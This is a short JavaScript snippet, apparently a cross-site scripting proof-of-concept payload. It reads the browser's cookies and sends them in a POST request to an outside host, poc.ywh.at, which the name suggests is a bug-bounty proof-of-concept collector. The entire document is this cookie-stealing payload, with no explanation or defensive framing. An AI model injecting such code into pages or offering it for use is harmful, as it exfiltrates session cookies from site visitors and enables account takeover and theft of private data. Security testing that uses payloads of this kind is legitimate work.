const cookies = document.cookie;
fetch('https://poc.ywh.at/FU-PII2', {
method: 'POST',
headers: {
'Content-Type': 'application/json'
},
body: JSON.stringify({ cookies })
});
